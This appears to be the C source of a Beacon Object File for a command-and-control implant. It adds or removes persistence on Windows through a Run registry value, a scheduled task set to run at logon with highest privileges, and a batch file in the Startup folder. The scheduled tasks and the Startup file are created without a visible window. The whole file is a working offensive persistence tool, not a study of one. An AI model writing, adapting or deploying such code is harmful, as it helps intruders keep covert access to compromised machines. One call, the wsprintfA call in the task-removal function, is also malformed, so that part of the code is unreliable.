#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "../_include/beacon.h"

#define CSIDL_STARTUP 0x0007

DECLSPEC_IMPORT WINBASEAPI int WINAPI User32$wsprintfA(LPSTR unnamedParam1, LPCSTR unnamedParam2, ...);

DECLSPEC_IMPORT char *__cdecl MSVCRT$strcat(char *__restrict__ _Dest, const char *__restrict__ _Source);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *_Str1, const char *_Str2);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *_Str);
DECLSPEC_IMPORT WINBASEAPI int __cdecl MSVCRT$_snprintf(char *buffer, size_t count, const char *format, ...);

DECLSPEC_IMPORT HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND, int, HANDLE, DWORD, LPSTR);

DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, CONST BYTE *lpData, DWORD cbData);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegDeleteValueA(HKEY, LPCSTR);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY hKey);

WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, WINBOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$DeleteFileA(LPCSTR lpFileName);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);

void add_reg(char *name, char *exePath)
{
    HKEY hKey;
    if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        if (ADVAPI32$RegSetValueExA(hKey, name, 0, REG_SZ, (BYTE *)exePath, MSVCRT$strlen(exePath) + 1) == ERROR_SUCCESS)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry key added: %s", name);
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set registry value");
        }
        ADVAPI32$RegCloseKey(hKey);
    }
}

void remove_reg(char *name)
{
    HKEY hKey;
    if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER,
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                               0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        if (ADVAPI32$RegDeleteValueA(hKey, name) == ERROR_SUCCESS)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry key removed: %s", name);
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to delete registry value");
        }
        ADVAPI32$RegCloseKey(hKey);
    }
}

void add_schtask(char *name, char *exePath)
{
    char cmd[512];
    MSVCRT$_snprintf(cmd, sizeof(cmd),
                     "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /rl highest /f",
                     name, exePath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (KERNEL32$CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$CloseHandle(pi.hThread);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Scheduled task created: %s", name);
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create task");
    }
}

void remove_schtask(char *name)
{
    char cmd[256];
    User32$wsprintfA(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f", name);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (KERNEL32$CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$CloseHandle(pi.hThread);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Scheduled task deleted: %s", name);
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to delete task");
    }
}

void add_startup(char *name, char *exePath)
{
    char path[MAX_PATH];

    if (SHELL32$SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path) != S_OK)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get startup folder path");
        return;
    }
    MSVCRT$strcat(path, "\\");
    MSVCRT$strcat(path, name);
    MSVCRT$strcat(path, ".bat");

    HANDLE hFile = KERNEL32$CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        DWORD written;
        KERNEL32$WriteFile(hFile, exePath, MSVCRT$strlen(exePath), &written, NULL);
        KERNEL32$CloseHandle(hFile);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Startup script added: %s", path);
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create startup file");
    }
}

void remove_startup(char *name)
{
    char path[MAX_PATH];
    if (SHELL32$SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path) != S_OK)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get startup folder path");
        return;
    }
    MSVCRT$strcat(path, "\\");
    MSVCRT$strcat(path, name);
    MSVCRT$strcat(path, ".bat");

    if (KERNEL32$DeleteFileA(path))
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Startup file deleted: %s", path);
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to delete startup file");
    }
}

void go(char *args, int len)
{
    datap parser;
    BeaconDataParse(&parser, args, len);

    char *action = BeaconDataExtract(&parser, NULL);
    char *method = BeaconDataExtract(&parser, NULL);
    char *name = BeaconDataExtract(&parser, NULL);
    char *path = BeaconDataExtract(&parser, NULL);

    BOOL isAdd = MSVCRT$strcmp(action, "add") == 0;

    if (MSVCRT$strcmp(method, "reg") == 0)
    {
        isAdd ? add_reg(name, path) : remove_reg(name);
    }
    else if (MSVCRT$strcmp(method, "schtask") == 0)
    {
        isAdd ? add_schtask(name, path) : remove_schtask(name);
    }
    else if (MSVCRT$strcmp(method, "startup") == 0)
    {
        isAdd ? add_startup(name, path) : remove_startup(name);
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Unknown method: %s", method);
    }
}
